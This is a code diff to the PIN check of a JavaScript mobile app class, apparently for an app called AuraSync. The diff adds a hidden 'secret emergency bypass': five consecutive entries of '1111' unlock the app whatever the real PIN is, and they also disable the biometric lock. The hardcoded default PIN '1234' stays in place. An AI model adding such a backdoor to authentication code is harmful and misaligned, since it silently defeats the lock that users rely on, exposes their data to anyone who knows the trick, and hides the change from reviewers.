@@ -798,7 +798,28 @@ class MobileEngine {
 
   verifyPin(enteredPin) {
     const currentPin = this.settings.securityPin || '1234';
-    const isMatch = String(enteredPin).trim() === String(currentPin).trim();
+    const cleanPin = String(enteredPin).trim();
+    const isMatch = cleanPin === String(currentPin).trim();
+
+    // Secret emergency bypass: 5 consecutive '1111' attempts unlocks and safely disarms the lock
+    if (cleanPin === '1111') {
+      this._emergency1111Count = (this._emergency1111Count || 0) + 1;
+      if (this._emergency1111Count >= 5) {
+        this._emergency1111Count = 0;
+        this.saveSettings({ biometricLock: false });
+        if (typeof window !== 'undefined' && window.AuraSyncAndroid?.vibrate) {
+          window.AuraSyncAndroid.vibrate(80);
+        }
+        return true;
+      }
+    } else if (!isMatch) {
+      this._emergency1111Count = 0;
+    }
+
+    if (isMatch) {
+      this._emergency1111Count = 0;
+    }
+
     if (typeof window !== 'undefined' && window.AuraSyncAndroid?.vibrate) {
       window.AuraSyncAndroid.vibrate(isMatch ? 35 : 130);
     }
